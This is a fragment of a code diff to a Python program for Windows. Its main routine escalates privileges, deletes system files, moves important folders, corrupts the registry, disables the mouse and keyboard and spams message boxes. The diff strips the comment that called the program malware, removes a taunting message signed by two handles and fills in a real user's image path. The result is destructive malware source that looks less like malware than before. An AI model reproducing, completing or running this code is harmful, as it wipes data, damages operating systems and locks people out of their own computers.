@@ -177,7 +177,7 @@ def elevate_privileges():
     except Exception as e:
         pass
 
-# Main function to execute the malware
+
 def main():
     elevate_privileges()
     root = tk.Tk()
@@ -187,12 +187,11 @@ def main():
     delete_system_files()
     move_important_folders()
     corrupt_system_registry()
-    change_desktop_background(r'C:\path\to\your\image.jpg')  
+    change_desktop_background(r"C:\Users\dalto\Downloads\maxresdefault.jpg")  
     rename_application_names()
     change_system_volume(0) 
     disable_mouse_and_keyboard()
     spam_hello_message_boxes()
-    messagebox.showinfo("Still want project ligma XD? \n fortnitepro01 and meflly100 was here", "")
     root.mainloop()
 
 if __name__ == "__main__":
